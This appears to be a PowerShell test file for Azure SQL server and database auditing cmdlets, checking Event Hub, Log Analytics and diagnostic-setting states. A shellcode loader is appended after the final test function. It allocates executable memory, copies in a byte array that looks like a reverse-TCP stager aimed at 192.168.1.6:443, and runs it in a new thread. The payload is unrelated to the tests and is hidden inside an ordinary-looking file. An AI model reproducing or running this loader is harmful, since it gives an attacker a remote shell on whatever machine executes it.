		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count "4"
		
		
		Remove-AzDiagnosticSetting -ResourceId $resourceId -Name $settingsName
		
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count "5"
		
		
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Set-AzSqlServerAudit -EventHubTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count "6"
		
		
		Remove-AzDiagnosticSetting -ResourceId $resourceId -Name $settingsName
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count "7"
		
		
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Set-AzSqlServerAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count "8"
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		
		Set-AzSqlServerAudit -LogAnalyticsTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count "9"
		
		
		Remove-AzDiagnosticSetting -ResourceId $resourceId -Name $settingsName
		
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Set-AzSqlServerAudit -EventHubTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-RemoveDatabaseAuditingSettingsMultipleDiagnosticSettings
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$subscriptionId = (Get-AzContext).Subscription.Id
	$workspaceResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.operationalinsights/workspaces/" + $params.workspaceName
	$eventHubAuthorizationRuleResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.EventHub/namespaces/" + $params.eventHubNamespace + "/authorizationrules/RootManageSharedAccessKey"
	$resourceId = "/subscriptions/" + $subscriptionId + "/resourceGroups/" + $params.rgname + "/providers/Microsoft.Sql/servers/" + $params.serverName + "/databases/" + $params.databaseName

	try
	{
		
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 0 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-Null $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace

		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId

		
		Set-AzSqlDatabaseAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace

		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId

		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count

		
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Category SQLSecurityAuditEvents -WorkspaceId $workspaceResourceId

		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Remove-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		
		
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		 
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count
		
		
		$foundAuditCategory = $False
		Foreach ($log in $diagnostics[0].Logs)
		{
			if ($log.Category -eq "SQLSecurityAuditEvents")
			{
				$foundAuditCategory = $True
				Assert-AreEqual $False $log.Enabled
				break
			}
		}
		
		Assert-AreEqual $True $foundAuditCategory
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-RemoveServerAuditingSettingsMultipleDiagnosticSettings
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$subscriptionId = (Get-AzContext).Subscription.Id
	$workspaceResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.operationalinsights/workspaces/" + $params.workspaceName
	$eventHubAuthorizationRuleResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.EventHub/namespaces/" + $params.eventHubNamespace + "/authorizationrules/RootManageSharedAccessKey"
	$resourceId = "/subscriptions/" + $subscriptionId + "/resourceGroups/" + $params.rgname + "/providers/Microsoft.Sql/servers/" + $params.serverName + "/databases/master"

	try
	{
		
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 0 $policy.AuditActionGroup.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Set-AzSqlServerAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId -BlobStorageTargetState Enabled -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count
		
		
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Category SQLSecurityAuditEvents -WorkspaceId $workspaceResourceId
		
		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Remove-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		
		
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		 
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count
		
		
		$foundAuditCategory = $False
		Foreach ($log in $diagnostics[0].Logs)
		{
			if ($log.Category -eq "SQLSecurityAuditEvents")
			{
				$foundAuditCategory = $True
				Assert-AreEqual $False $log.Enabled
				break
			}
		}
		
		Assert-AreEqual $True $foundAuditCategory
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}
$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x06,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

